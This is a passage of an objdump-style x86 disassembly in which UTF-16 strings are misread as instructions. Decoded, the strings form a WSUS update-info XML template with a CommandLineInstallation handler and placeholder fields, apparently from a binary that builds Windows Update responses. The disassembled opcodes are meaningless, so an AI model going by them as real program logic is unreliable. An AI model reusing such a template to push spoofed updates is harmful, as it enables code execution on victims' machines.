  409ba5:	64 00 79 00          	add    %bh,%fs:0x0(%ecx)
  409ba9:	20 00                	and    %al,(%eax)
  409bab:	78 00                	js     0x409bad
  409bad:	6d                   	insl   (%dx),%es:(%edi)
  409bae:	00 6c 00 6e          	add    %ch,0x6e(%eax,%eax,1)
  409bb2:	00 73 00             	add    %dh,0x0(%ebx)
  409bb5:	3a 00                	cmp    (%eax),%al
  409bb7:	78 00                	js     0x409bb9
  409bb9:	73 00                	jae    0x409bbb
  409bbb:	69 00 3d 00 22 00    	imul   $0x22003d,(%eax),%eax
  409bc1:	68 00 74 00 74       	push   $0x74007400
  409bc6:	00 70 00             	add    %dh,0x0(%eax)
  409bc9:	3a 00                	cmp    (%eax),%al
  409bcb:	2f                   	das
  409bcc:	00 2f                	add    %ch,(%edi)
  409bce:	00 77 00             	add    %dh,0x0(%edi)
  409bd1:	77 00                	ja     0x409bd3
  409bd3:	77 00                	ja     0x409bd5
  409bd5:	2e 00 77 00          	add    %dh,%cs:0x0(%edi)
  409bd9:	33 00                	xor    (%eax),%eax
  409bdb:	2e 00 6f 00          	add    %ch,%cs:0x0(%edi)
  409bdf:	72 00                	jb     0x409be1
  409be1:	67 00 2f             	add    %ch,(%bx)
  409be4:	00 32                	add    %dh,(%edx)
  409be6:	00 30                	add    %dh,(%eax)
  409be8:	00 30                	add    %dh,(%eax)
  409bea:	00 31                	add    %dh,(%ecx)
  409bec:	00 2f                	add    %ch,(%edi)
  409bee:	00 58 00             	add    %bl,0x0(%eax)
  409bf1:	4d                   	dec    %ebp
  409bf2:	00 4c 00 53          	add    %cl,0x53(%eax,%eax,1)
  409bf6:	00 63 00             	add    %ah,0x0(%ebx)
  409bf9:	68 00 65 00 6d       	push   $0x6d006500
  409bfe:	00 61 00             	add    %ah,0x0(%ecx)
  409c01:	2d 00 69 00 6e       	sub    $0x6e006900,%eax
  409c06:	00 73 00             	add    %dh,0x0(%ebx)
  409c09:	74 00                	je     0x409c0b
  409c0b:	61                   	popa
  409c0c:	00 6e 00             	add    %ch,0x0(%esi)
  409c0f:	63 00                	arpl   %eax,(%eax)
  409c11:	65 00 22             	add    %ah,%gs:(%edx)
  409c14:	00 20                	add    %ah,(%eax)
  409c16:	00 78 00             	add    %bh,0x0(%eax)
  409c19:	6d                   	insl   (%dx),%es:(%edi)
  409c1a:	00 6c 00 6e          	add    %ch,0x6e(%eax,%eax,1)
  409c1e:	00 73 00             	add    %dh,0x0(%ebx)
  409c21:	3a 00                	cmp    (%eax),%al
  409c23:	78 00                	js     0x409c25
  409c25:	73 00                	jae    0x409c27
  409c27:	64 00 3d 00 22 00 68 	add    %bh,%fs:0x68002200
  409c2e:	00 74 00 74          	add    %dh,0x74(%eax,%eax,1)
  409c32:	00 70 00             	add    %dh,0x0(%eax)
  409c35:	3a 00                	cmp    (%eax),%al
  409c37:	2f                   	das
  409c38:	00 2f                	add    %ch,(%edi)
  409c3a:	00 77 00             	add    %dh,0x0(%edi)
  409c3d:	77 00                	ja     0x409c3f
  409c3f:	77 00                	ja     0x409c41
  409c41:	2e 00 77 00          	add    %dh,%cs:0x0(%edi)
  409c45:	33 00                	xor    (%eax),%eax
  409c47:	2e 00 6f 00          	add    %ch,%cs:0x0(%edi)
  409c4b:	72 00                	jb     0x409c4d
  409c4d:	67 00 2f             	add    %ch,(%bx)
  409c50:	00 32                	add    %dh,(%edx)
  409c52:	00 30                	add    %dh,(%eax)
  409c54:	00 30                	add    %dh,(%eax)
  409c56:	00 31                	add    %dh,(%ecx)
  409c58:	00 2f                	add    %ch,(%edi)
  409c5a:	00 58 00             	add    %bl,0x0(%eax)
  409c5d:	4d                   	dec    %ebp
  409c5e:	00 4c 00 53          	add    %cl,0x53(%eax,%eax,1)
  409c62:	00 63 00             	add    %ah,0x0(%ebx)
  409c65:	68 00 65 00 6d       	push   $0x6d006500
  409c6a:	00 61 00             	add    %ah,0x0(%ecx)
  409c6d:	22 00                	and    (%eax),%al
  409c6f:	3e 00 0d 00 0a 00 20 	add    %cl,%ds:0x20000a00
  409c76:	00 20                	add    %ah,(%eax)
  409c78:	00 20                	add    %ah,(%eax)
  409c7a:	00 20                	add    %ah,(%eax)
  409c7c:	00 20                	add    %ah,(%eax)
  409c7e:	00 20                	add    %ah,(%eax)
  409c80:	00 20                	add    %ah,(%eax)
  409c82:	00 20                	add    %ah,(%eax)
  409c84:	00 3c 00             	add    %bh,(%eax,%eax,1)
  409c87:	47                   	inc    %edi
  409c88:	00 65 00             	add    %ah,0x0(%ebp)
  409c8b:	74 00                	je     0x409c8d
  409c8d:	45                   	inc    %ebp
  409c8e:	00 78 00             	add    %bh,0x0(%eax)
  409c91:	74 00                	je     0x409c93
  409c93:	65 00 6e 00          	add    %ch,%gs:0x0(%esi)
  409c97:	64 00 65 00          	add    %ah,%fs:0x0(%ebp)
  409c9b:	64 00 55 00          	add    %dl,%fs:0x0(%ebp)
  409c9f:	70 00                	jo     0x409ca1
  409ca1:	64 00 61 00          	add    %ah,%fs:0x0(%ecx)
  409ca5:	74 00                	je     0x409ca7
  409ca7:	65 00 49 00          	add    %cl,%gs:0x0(%ecx)
  409cab:	6e                   	outsb  %ds:(%esi),(%dx)
  409cac:	00 66 00             	add    %ah,0x0(%esi)
  409caf:	6f                   	outsl  %ds:(%esi),(%dx)
  409cb0:	00 52 00             	add    %dl,0x0(%edx)
  409cb3:	65 00 73 00          	add    %dh,%gs:0x0(%ebx)
  409cb7:	70 00                	jo     0x409cb9
  409cb9:	6f                   	outsl  %ds:(%esi),(%dx)
  409cba:	00 6e 00             	add    %ch,0x0(%esi)
  409cbd:	73 00                	jae    0x409cbf
  409cbf:	65 00 20             	add    %ah,%gs:(%eax)
  409cc2:	00 78 00             	add    %bh,0x0(%eax)
  409cc5:	6d                   	insl   (%dx),%es:(%edi)
  409cc6:	00 6c 00 6e          	add    %ch,0x6e(%eax,%eax,1)
  409cca:	00 73 00             	add    %dh,0x0(%ebx)
  409ccd:	3d 00 22 00 68       	cmp    $0x68002200,%eax
  409cd2:	00 74 00 74          	add    %dh,0x74(%eax,%eax,1)
  409cd6:	00 70 00             	add    %dh,0x0(%eax)
  409cd9:	3a 00                	cmp    (%eax),%al
  409cdb:	2f                   	das
  409cdc:	00 2f                	add    %ch,(%edi)
  409cde:	00 77 00             	add    %dh,0x0(%edi)
  409ce1:	77 00                	ja     0x409ce3
  409ce3:	77 00                	ja     0x409ce5
  409ce5:	2e 00 6d 00          	add    %ch,%cs:0x0(%ebp)
  409ce9:	69 00 63 00 72 00    	imul   $0x720063,(%eax),%eax
  409cef:	6f                   	outsl  %ds:(%esi),(%dx)
  409cf0:	00 73 00             	add    %dh,0x0(%ebx)
  409cf3:	6f                   	outsl  %ds:(%esi),(%dx)
  409cf4:	00 66 00             	add    %ah,0x0(%esi)
  409cf7:	74 00                	je     0x409cf9
  409cf9:	2e 00 63 00          	add    %ah,%cs:0x0(%ebx)
  409cfd:	6f                   	outsl  %ds:(%esi),(%dx)
  409cfe:	00 6d 00             	add    %ch,0x0(%ebp)
  409d01:	2f                   	das
  409d02:	00 53 00             	add    %dl,0x0(%ebx)
  409d05:	6f                   	outsl  %ds:(%esi),(%dx)
  409d06:	00 66 00             	add    %ah,0x0(%esi)
  409d09:	74 00                	je     0x409d0b
  409d0b:	77 00                	ja     0x409d0d
  409d0d:	61                   	popa
  409d0e:	00 72 00             	add    %dh,0x0(%edx)
  409d11:	65 00 44 00 69       	add    %al,%gs:0x69(%eax,%eax,1)
  409d16:	00 73 00             	add    %dh,0x0(%ebx)
  409d19:	74 00                	je     0x409d1b
  409d1b:	72 00                	jb     0x409d1d
  409d1d:	69 00 62 00 75 00    	imul   $0x750062,(%eax),%eax
  409d23:	74 00                	je     0x409d25
  409d25:	69 00 6f 00 6e 00    	imul   $0x6e006f,(%eax),%eax
  409d2b:	2f                   	das
  409d2c:	00 53 00             	add    %dl,0x0(%ebx)
  409d2f:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  409d33:	76 00                	jbe    0x409d35
  409d35:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  409d39:	2f                   	das
  409d3a:	00 43 00             	add    %al,0x0(%ebx)
  409d3d:	6c                   	insb   (%dx),%es:(%edi)
  409d3e:	00 69 00             	add    %ch,0x0(%ecx)
  409d41:	65 00 6e 00          	add    %ch,%gs:0x0(%esi)
  409d45:	74 00                	je     0x409d47
  409d47:	57                   	push   %edi
  409d48:	00 65 00             	add    %ah,0x0(%ebp)
  409d4b:	62 00                	bound  %eax,(%eax)
  409d4d:	53                   	push   %ebx
  409d4e:	00 65 00             	add    %ah,0x0(%ebp)
  409d51:	72 00                	jb     0x409d53
  409d53:	76 00                	jbe    0x409d55
  409d55:	69 00 63 00 65 00    	imul   $0x650063,(%eax),%eax
  409d5b:	22 00                	and    (%eax),%al
  409d5d:	3e 00 0d 00 0a 00 20 	add    %cl,%ds:0x20000a00
  409d64:	00 20                	add    %ah,(%eax)
  409d66:	00 20                	add    %ah,(%eax)
  409d68:	00 20                	add    %ah,(%eax)
  409d6a:	00 20                	add    %ah,(%eax)
  409d6c:	00 20                	add    %ah,(%eax)
  409d6e:	00 20                	add    %ah,(%eax)
  409d70:	00 20                	add    %ah,(%eax)
  409d72:	00 20                	add    %ah,(%eax)
  409d74:	00 20                	add    %ah,(%eax)
  409d76:	00 20                	add    %ah,(%eax)
  409d78:	00 20                	add    %ah,(%eax)
  409d7a:	00 3c 00             	add    %bh,(%eax,%eax,1)
  409d7d:	47                   	inc    %edi
  409d7e:	00 65 00             	add    %ah,0x0(%ebp)
  409d81:	74 00                	je     0x409d83
  409d83:	45                   	inc    %ebp
  409d84:	00 78 00             	add    %bh,0x0(%eax)
  409d87:	74 00                	je     0x409d89
  409d89:	65 00 6e 00          	add    %ch,%gs:0x0(%esi)
  409d8d:	64 00 65 00          	add    %ah,%fs:0x0(%ebp)
  409d91:	64 00 55 00          	add    %dl,%fs:0x0(%ebp)
  409d95:	70 00                	jo     0x409d97
  409d97:	64 00 61 00          	add    %ah,%fs:0x0(%ecx)
  409d9b:	74 00                	je     0x409d9d
  409d9d:	65 00 49 00          	add    %cl,%gs:0x0(%ecx)
  409da1:	6e                   	outsb  %ds:(%esi),(%dx)
  409da2:	00 66 00             	add    %ah,0x0(%esi)
  409da5:	6f                   	outsl  %ds:(%esi),(%dx)
  409da6:	00 52 00             	add    %dl,0x0(%edx)
  409da9:	65 00 73 00          	add    %dh,%gs:0x0(%ebx)
  409dad:	75 00                	jne    0x409daf
  409daf:	6c                   	insb   (%dx),%es:(%edi)
  409db0:	00 74 00 3e          	add    %dh,0x3e(%eax,%eax,1)
  409db4:	00 0d 00 0a 00 20    	add    %cl,0x20000a00
  409dba:	00 20                	add    %ah,(%eax)
  409dbc:	00 20                	add    %ah,(%eax)
  409dbe:	00 20                	add    %ah,(%eax)
  409dc0:	00 20                	add    %ah,(%eax)
  409dc2:	00 20                	add    %ah,(%eax)
  409dc4:	00 20                	add    %ah,(%eax)
  409dc6:	00 20                	add    %ah,(%eax)
  409dc8:	00 20                	add    %ah,(%eax)
  409dca:	00 20                	add    %ah,(%eax)
  409dcc:	00 20                	add    %ah,(%eax)
  409dce:	00 20                	add    %ah,(%eax)
  409dd0:	00 20                	add    %ah,(%eax)
  409dd2:	00 20                	add    %ah,(%eax)
  409dd4:	00 20                	add    %ah,(%eax)
  409dd6:	00 20                	add    %ah,(%eax)
  409dd8:	00 3c 00             	add    %bh,(%eax,%eax,1)
  409ddb:	55                   	push   %ebp
  409ddc:	00 70 00             	add    %dh,0x0(%eax)
  409ddf:	64 00 61 00          	add    %ah,%fs:0x0(%ecx)
  409de3:	74 00                	je     0x409de5
  409de5:	65 00 73 00          	add    %dh,%gs:0x0(%ebx)
  409de9:	3e 00 0d 00 0a 00 20 	add    %cl,%ds:0x20000a00
  409df0:	00 20                	add    %ah,(%eax)
  409df2:	00 20                	add    %ah,(%eax)
  409df4:	00 20                	add    %ah,(%eax)
  409df6:	00 20                	add    %ah,(%eax)
  409df8:	00 20                	add    %ah,(%eax)
  409dfa:	00 20                	add    %ah,(%eax)
  409dfc:	00 20                	add    %ah,(%eax)
  409dfe:	00 20                	add    %ah,(%eax)
  409e00:	00 20                	add    %ah,(%eax)
  409e02:	00 20                	add    %ah,(%eax)
  409e04:	00 20                	add    %ah,(%eax)
  409e06:	00 20                	add    %ah,(%eax)
  409e08:	00 20                	add    %ah,(%eax)
  409e0a:	00 20                	add    %ah,(%eax)
  409e0c:	00 20                	add    %ah,(%eax)
  409e0e:	00 20                	add    %ah,(%eax)
  409e10:	00 20                	add    %ah,(%eax)
  409e12:	00 20                	add    %ah,(%eax)
  409e14:	00 20                	add    %ah,(%eax)
  409e16:	00 3c 00             	add    %bh,(%eax,%eax,1)
  409e19:	55                   	push   %ebp
  409e1a:	00 70 00             	add    %dh,0x0(%eax)
  409e1d:	64 00 61 00          	add    %ah,%fs:0x0(%ecx)
  409e21:	74 00                	je     0x409e23
  409e23:	65 00 3e             	add    %bh,%gs:(%esi)
  409e26:	00 0d 00 0a 00 20    	add    %cl,0x20000a00
  409e2c:	00 20                	add    %ah,(%eax)
  409e2e:	00 20                	add    %ah,(%eax)
  409e30:	00 20                	add    %ah,(%eax)
  409e32:	00 20                	add    %ah,(%eax)
  409e34:	00 20                	add    %ah,(%eax)
  409e36:	00 20                	add    %ah,(%eax)
  409e38:	00 20                	add    %ah,(%eax)
  409e3a:	00 20                	add    %ah,(%eax)
  409e3c:	00 20                	add    %ah,(%eax)
  409e3e:	00 20                	add    %ah,(%eax)
  409e40:	00 20                	add    %ah,(%eax)
  409e42:	00 20                	add    %ah,(%eax)
  409e44:	00 20                	add    %ah,(%eax)
  409e46:	00 20                	add    %ah,(%eax)
  409e48:	00 20                	add    %ah,(%eax)
  409e4a:	00 20                	add    %ah,(%eax)
  409e4c:	00 20                	add    %ah,(%eax)
  409e4e:	00 20                	add    %ah,(%eax)
  409e50:	00 20                	add    %ah,(%eax)
  409e52:	00 20                	add    %ah,(%eax)
  409e54:	00 20                	add    %ah,(%eax)
  409e56:	00 20                	add    %ah,(%eax)
  409e58:	00 20                	add    %ah,(%eax)
  409e5a:	00 3c 00             	add    %bh,(%eax,%eax,1)
  409e5d:	49                   	dec    %ecx
  409e5e:	00 44 00 3e          	add    %al,0x3e(%eax,%eax,1)
  409e62:	00 7b 00             	add    %bh,0x0(%ebx)
  409e65:	30 00                	xor    %al,(%eax)
  409e67:	7d 00                	jge    0x409e69
  409e69:	3c 00                	cmp    $0x0,%al
  409e6b:	2f                   	das
  409e6c:	00 49 00             	add    %cl,0x0(%ecx)
  409e6f:	44                   	inc    %esp
  409e70:	00 3e                	add    %bh,(%esi)
  409e72:	00 0d 00 0a 00 20    	add    %cl,0x20000a00
  409e78:	00 20                	add    %ah,(%eax)
  409e7a:	00 20                	add    %ah,(%eax)
  409e7c:	00 20                	add    %ah,(%eax)
  409e7e:	00 20                	add    %ah,(%eax)
  409e80:	00 20                	add    %ah,(%eax)
  409e82:	00 20                	add    %ah,(%eax)
  409e84:	00 20                	add    %ah,(%eax)
  409e86:	00 20                	add    %ah,(%eax)
  409e88:	00 20                	add    %ah,(%eax)
  409e8a:	00 20                	add    %ah,(%eax)
  409e8c:	00 20                	add    %ah,(%eax)
  409e8e:	00 20                	add    %ah,(%eax)
  409e90:	00 20                	add    %ah,(%eax)
  409e92:	00 20                	add    %ah,(%eax)
  409e94:	00 20                	add    %ah,(%eax)
  409e96:	00 20                	add    %ah,(%eax)
  409e98:	00 20                	add    %ah,(%eax)
  409e9a:	00 20                	add    %ah,(%eax)
  409e9c:	00 20                	add    %ah,(%eax)
  409e9e:	00 20                	add    %ah,(%eax)
  409ea0:	00 20                	add    %ah,(%eax)
  409ea2:	00 20                	add    %ah,(%eax)
  409ea4:	00 20                	add    %ah,(%eax)
  409ea6:	00 3c 00             	add    %bh,(%eax,%eax,1)
  409ea9:	58                   	pop    %eax
  409eaa:	00 6d 00             	add    %ch,0x0(%ebp)
  409ead:	6c                   	insb   (%dx),%es:(%edi)
  409eae:	00 3e                	add    %bh,(%esi)
  409eb0:	00 26                	add    %ah,(%esi)
  409eb2:	00 6c 00 74          	add    %ch,0x74(%eax,%eax,1)
  409eb6:	00 3b                	add    %bh,(%ebx)
  409eb8:	00 45 00             	add    %al,0x0(%ebp)
  409ebb:	78 00                	js     0x409ebd
  409ebd:	74 00                	je     0x409ebf
  409ebf:	65 00 6e 00          	add    %ch,%gs:0x0(%esi)
  409ec3:	64 00 65 00          	add    %ah,%fs:0x0(%ebp)
  409ec7:	64 00 50 00          	add    %dl,%fs:0x0(%eax)
  409ecb:	72 00                	jb     0x409ecd
  409ecd:	6f                   	outsl  %ds:(%esi),(%dx)
  409ece:	00 70 00             	add    %dh,0x0(%eax)
  409ed1:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  409ed5:	74 00                	je     0x409ed7
  409ed7:	69 00 65 00 73 00    	imul   $0x730065,(%eax),%eax
  409edd:	20 00                	and    %al,(%eax)
  409edf:	44                   	inc    %esp
  409ee0:	00 65 00             	add    %ah,0x0(%ebp)
  409ee3:	66 00 61 00          	data16 add %ah,0x0(%ecx)
  409ee7:	75 00                	jne    0x409ee9
  409ee9:	6c                   	insb   (%dx),%es:(%edi)
  409eea:	00 74 00 50          	add    %dh,0x50(%eax,%eax,1)
  409eee:	00 72 00             	add    %dh,0x0(%edx)
  409ef1:	6f                   	outsl  %ds:(%esi),(%dx)
  409ef2:	00 70 00             	add    %dh,0x0(%eax)
  409ef5:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  409ef9:	74 00                	je     0x409efb
  409efb:	69 00 65 00 73 00    	imul   $0x730065,(%eax),%eax
  409f01:	4c                   	dec    %esp
  409f02:	00 61 00             	add    %ah,0x0(%ecx)
  409f05:	6e                   	outsb  %ds:(%esi),(%dx)
  409f06:	00 67 00             	add    %ah,0x0(%edi)
  409f09:	75 00                	jne    0x409f0b
  409f0b:	61                   	popa
  409f0c:	00 67 00             	add    %ah,0x0(%edi)
  409f0f:	65 00 3d 00 22 00 65 	add    %bh,%gs:0x65002200
  409f16:	00 6e 00             	add    %ch,0x0(%esi)
  409f19:	22 00                	and    (%eax),%al
  409f1b:	20 00                	and    %al,(%eax)
  409f1d:	48                   	dec    %eax
  409f1e:	00 61 00             	add    %ah,0x0(%ecx)
  409f21:	6e                   	outsb  %ds:(%esi),(%dx)
  409f22:	00 64 00 6c          	add    %ah,0x6c(%eax,%eax,1)
  409f26:	00 65 00             	add    %ah,0x0(%ebp)
  409f29:	72 00                	jb     0x409f2b
  409f2b:	3d 00 22 00 68       	cmp    $0x68002200,%eax
  409f30:	00 74 00 74          	add    %dh,0x74(%eax,%eax,1)
  409f34:	00 70 00             	add    %dh,0x0(%eax)
  409f37:	3a 00                	cmp    (%eax),%al
  409f39:	2f                   	das
  409f3a:	00 2f                	add    %ch,(%edi)
  409f3c:	00 73 00             	add    %dh,0x0(%ebx)
  409f3f:	63 00                	arpl   %eax,(%eax)
  409f41:	68 00 65 00 6d       	push   $0x6d006500
  409f46:	00 61 00             	add    %ah,0x0(%ecx)
  409f49:	73 00                	jae    0x409f4b
  409f4b:	2e 00 6d 00          	add    %ch,%cs:0x0(%ebp)
  409f4f:	69 00 63 00 72 00    	imul   $0x720063,(%eax),%eax
  409f55:	6f                   	outsl  %ds:(%esi),(%dx)
  409f56:	00 73 00             	add    %dh,0x0(%ebx)
  409f59:	6f                   	outsl  %ds:(%esi),(%dx)
  409f5a:	00 66 00             	add    %ah,0x0(%esi)
  409f5d:	74 00                	je     0x409f5f
  409f5f:	2e 00 63 00          	add    %ah,%cs:0x0(%ebx)
  409f63:	6f                   	outsl  %ds:(%esi),(%dx)
  409f64:	00 6d 00             	add    %ch,0x0(%ebp)
  409f67:	2f                   	das
  409f68:	00 6d 00             	add    %ch,0x0(%ebp)
  409f6b:	73 00                	jae    0x409f6d
  409f6d:	75 00                	jne    0x409f6f
  409f6f:	73 00                	jae    0x409f71
  409f71:	2f                   	das
  409f72:	00 32                	add    %dh,(%edx)
  409f74:	00 30                	add    %dh,(%eax)
  409f76:	00 30                	add    %dh,(%eax)
  409f78:	00 32                	add    %dh,(%edx)
  409f7a:	00 2f                	add    %ch,(%edi)
  409f7c:	00 31                	add    %dh,(%ecx)
  409f7e:	00 32                	add    %dh,(%edx)
  409f80:	00 2f                	add    %ch,(%edi)
  409f82:	00 55 00             	add    %dl,0x0(%ebp)
  409f85:	70 00                	jo     0x409f87
  409f87:	64 00 61 00          	add    %ah,%fs:0x0(%ecx)
  409f8b:	74 00                	je     0x409f8d
  409f8d:	65 00 48 00          	add    %cl,%gs:0x0(%eax)
  409f91:	61                   	popa
  409f92:	00 6e 00             	add    %ch,0x0(%esi)
  409f95:	64 00 6c 00 65       	add    %ch,%fs:0x65(%eax,%eax,1)
  409f9a:	00 72 00             	add    %dh,0x0(%edx)
  409f9d:	73 00                	jae    0x409f9f
  409f9f:	2f                   	das
  409fa0:	00 43 00             	add    %al,0x0(%ebx)
  409fa3:	6f                   	outsl  %ds:(%esi),(%dx)
  409fa4:	00 6d 00             	add    %ch,0x0(%ebp)
  409fa7:	6d                   	insl   (%dx),%es:(%edi)
  409fa8:	00 61 00             	add    %ah,0x0(%ecx)
  409fab:	6e                   	outsb  %ds:(%esi),(%dx)
  409fac:	00 64 00 4c          	add    %ah,0x4c(%eax,%eax,1)
  409fb0:	00 69 00             	add    %ch,0x0(%ecx)
  409fb3:	6e                   	outsb  %ds:(%esi),(%dx)
  409fb4:	00 65 00             	add    %ah,0x0(%ebp)
  409fb7:	49                   	dec    %ecx
  409fb8:	00 6e 00             	add    %ch,0x0(%esi)
  409fbb:	73 00                	jae    0x409fbd
  409fbd:	74 00                	je     0x409fbf
  409fbf:	61                   	popa
  409fc0:	00 6c 00 6c          	add    %ch,0x6c(%eax,%eax,1)
  409fc4:	00 61 00             	add    %ah,0x0(%ecx)
  409fc7:	74 00                	je     0x409fc9
  409fc9:	69 00 6f 00 6e 00    	imul   $0x6e006f,(%eax),%eax
  409fcf:	22 00                	and    (%eax),%al
  409fd1:	20 00                	and    %al,(%eax)
  409fd3:	4d                   	dec    %ebp
  409fd4:	00 61 00             	add    %ah,0x0(%ecx)
  409fd7:	78 00                	js     0x409fd9
  409fd9:	44                   	inc    %esp
  409fda:	00 6f 00             	add    %ch,0x0(%edi)
  409fdd:	77 00                	ja     0x409fdf
  409fdf:	6e                   	outsb  %ds:(%esi),(%dx)
  409fe0:	00 6c 00 6f          	add    %ch,0x6f(%eax,%eax,1)
  409fe4:	00 61 00             	add    %ah,0x0(%ecx)
  409fe7:	64 00 53 00          	add    %dl,%fs:0x0(%ebx)
  409feb:	69 00 7a 00 65 00    	imul   $0x65007a,(%eax),%eax
  409ff1:	3d 00 22 00 7b       	cmp    $0x7b002200,%eax
  409ff6:	00 31                	add    %dh,(%ecx)
  409ff8:	00 7d 00             	add    %bh,0x0(%ebp)
  409ffb:	22 00                	and    (%eax),%al
  409ffd:	20 00                	and    %al,(%eax)
  409fff:	4d                   	dec    %ebp
  40a000:	00 69 00             	add    %ch,0x0(%ecx)
  40a003:	6e                   	outsb  %ds:(%esi),(%dx)
  40a004:	00 44 00 6f          	add    %al,0x6f(%eax,%eax,1)
  40a008:	00 77 00             	add    %dh,0x0(%edi)
  40a00b:	6e                   	outsb  %ds:(%esi),(%dx)
  40a00c:	00 6c 00 6f          	add    %ch,0x6f(%eax,%eax,1)
  40a010:	00 61 00             	add    %ah,0x0(%ecx)
  40a013:	64 00 53 00          	add    %dl,%fs:0x0(%ebx)
  40a017:	69 00 7a 00 65 00    	imul   $0x65007a,(%eax),%eax
  40a01d:	3d 00 22 00 7b       	cmp    $0x7b002200,%eax
  40a022:	00 32                	add    %dh,(%edx)
  40a024:	00 7d 00             	add    %bh,0x0(%ebp)
  40a027:	22 00                	and    (%eax),%al
  40a029:	26 00 67 00          	add    %ah,%es:0x0(%edi)
  40a02d:	74 00                	je     0x40a02f
  40a02f:	3b 00                	cmp    (%eax),%eax
  40a031:	26 00 6c 00 74       	add    %ch,%es:0x74(%eax,%eax,1)
  40a036:	00 3b                	add    %bh,(%ebx)
  40a038:	00 49 00             	add    %cl,0x0(%ecx)
  40a03b:	6e                   	outsb  %ds:(%esi),(%dx)
  40a03c:	00 73 00             	add    %dh,0x0(%ebx)
  40a03f:	74 00                	je     0x40a041
  40a041:	61                   	popa
  40a042:	00 6c 00 6c          	add    %ch,0x6c(%eax,%eax,1)
  40a046:	00 61 00             	add    %ah,0x0(%ecx)
  40a049:	74 00                	je     0x40a04b
  40a04b:	69 00 6f 00 6e 00    	imul   $0x6e006f,(%eax),%eax
  40a051:	42                   	inc    %edx
  40a052:	00 65 00             	add    %ah,0x0(%ebp)
  40a055:	68 00 61 00 76       	push   $0x76006100
  40a05a:	00 69 00             	add    %ch,0x0(%ecx)
  40a05d:	6f                   	outsl  %ds:(%esi),(%dx)
  40a05e:	00 72 00             	add    %dh,0x0(%edx)
  40a061:	20 00                	and    %al,(%eax)
  40a063:	52                   	push   %edx
  40a064:	00 65 00             	add    %ah,0x0(%ebp)
  40a067:	62 00                	bound  %eax,(%eax)
  40a069:	6f                   	outsl  %ds:(%esi),(%dx)
  40a06a:	00 6f 00             	add    %ch,0x0(%edi)
  40a06d:	74 00                	je     0x40a06f
  40a06f:	42                   	inc    %edx
  40a070:	00 65 00             	add    %ah,0x0(%ebp)
  40a073:	68 00 61 00 76       	push   $0x76006100
  40a078:	00 69 00             	add    %ch,0x0(%ecx)
  40a07b:	6f                   	outsl  %ds:(%esi),(%dx)
  40a07c:	00 72 00             	add    %dh,0x0(%edx)
  40a07f:	3d 00 22 00 4e       	cmp    $0x4e002200,%eax
  40a084:	00 65 00             	add    %ah,0x0(%ebp)
  40a087:	76 00                	jbe    0x40a089
  40a089:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  40a08d:	52                   	push   %edx
  40a08e:	00 65 00             	add    %ah,0x0(%ebp)
  40a091:	62 00                	bound  %eax,(%eax)
  40a093:	6f                   	outsl  %ds:(%esi),(%dx)
  40a094:	00 6f 00             	add    %ch,0x0(%edi)
  40a097:	74 00                	je     0x40a099
  40a099:	73 00                	jae    0x40a09b
  40a09b:	22 00                	and    (%eax),%al
  40a09d:	20 00                	and    %al,(%eax)
  40a09f:	2f                   	das
  40a0a0:	00 26                	add    %ah,(%esi)
  40a0a2:	00 67 00             	add    %ah,0x0(%edi)
  40a0a5:	74 00                	je     0x40a0a7
  40a0a7:	3b 00                	cmp    (%eax),%eax
  40a0a9:	26 00 6c 00 74       	add    %ch,%es:0x74(%eax,%eax,1)
  40a0ae:	00 3b                	add    %bh,(%ebx)
  40a0b0:	00 2f                	add    %ch,(%edi)
  40a0b2:	00 45 00             	add    %al,0x0(%ebp)
  40a0b5:	78 00                	js     0x40a0b7
  40a0b7:	74 00                	je     0x40a0b9
  40a0b9:	65 00 6e 00          	add    %ch,%gs:0x0(%esi)
  40a0bd:	64 00 65 00          	add    %ah,%fs:0x0(%ebp)
  40a0c1:	64 00 50 00          	add    %dl,%fs:0x0(%eax)
  40a0c5:	72 00                	jb     0x40a0c7
  40a0c7:	6f                   	outsl  %ds:(%esi),(%dx)
  40a0c8:	00 70 00             	add    %dh,0x0(%eax)
  40a0cb:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  40a0cf:	74 00                	je     0x40a0d1
  40a0d1:	69 00 65 00 73 00    	imul   $0x730065,(%eax),%eax
  40a0d7:	26 00 67 00          	add    %ah,%es:0x0(%edi)
  40a0db:	74 00                	je     0x40a0dd
  40a0dd:	3b 00                	cmp    (%eax),%eax
  40a0df:	26 00 6c 00 74       	add    %ch,%es:0x74(%eax,%eax,1)
  40a0e4:	00 3b                	add    %bh,(%ebx)
  40a0e6:	00 46 00             	add    %al,0x0(%esi)
  40a0e9:	69 00 6c 00 65 00    	imul   $0x65006c,(%eax),%eax
  40a0ef:	73 00                	jae    0x40a0f1
  40a0f1:	26 00 67 00          	add    %ah,%es:0x0(%edi)
  40a0f5:	74 00                	je     0x40a0f7
  40a0f7:	3b 00                	cmp    (%eax),%eax
  40a0f9:	26 00 6c 00 74       	add    %ch,%es:0x74(%eax,%eax,1)
  40a0fe:	00 3b                	add    %bh,(%ebx)
  40a100:	00 46 00             	add    %al,0x0(%esi)
  40a103:	69 00 6c 00 65 00    	imul   $0x65006c,(%eax),%eax
  40a109:	20 00                	and    %al,(%eax)
  40a10b:	44                   	inc    %esp
  40a10c:	00 69 00             	add    %ch,0x0(%ecx)
  40a10f:	67 00 65 00          	add    %ah,0x0(%di)
  40a113:	73 00                	jae    0x40a115
  40a115:	74 00                	je     0x40a117
  40a117:	3d 00 22 00 7b       	cmp    $0x7b002200,%eax
  40a11c:	00 33                	add    %dh,(%ebx)
  40a11e:	00 7d 00             	add    %bh,0x0(%ebp)
  40a121:	22 00                	and    (%eax),%al
  40a123:	20 00                	and    %al,(%eax)
  40a125:	44                   	inc    %esp
  40a126:	00 69 00             	add    %ch,0x0(%ecx)
  40a129:	67 00 65 00          	add    %ah,0x0(%di)
  40a12d:	73 00                	jae    0x40a12f
  40a12f:	74 00                	je     0x40a131
  40a131:	41                   	inc    %ecx
  40a132:	00 6c 00 67          	add    %ch,0x67(%eax,%eax,1)
  40a136:	00 6f 00             	add    %ch,0x0(%edi)
  40a139:	72 00                	jb     0x40a13b
  40a13b:	69 00 74 00 68 00    	imul   $0x680074,(%eax),%eax
  40a141:	6d                   	insl   (%dx),%es:(%edi)
  40a142:	00 3d 00 22 00 53    	add    %bh,0x53002200
  40a148:	00 48 00             	add    %cl,0x0(%eax)
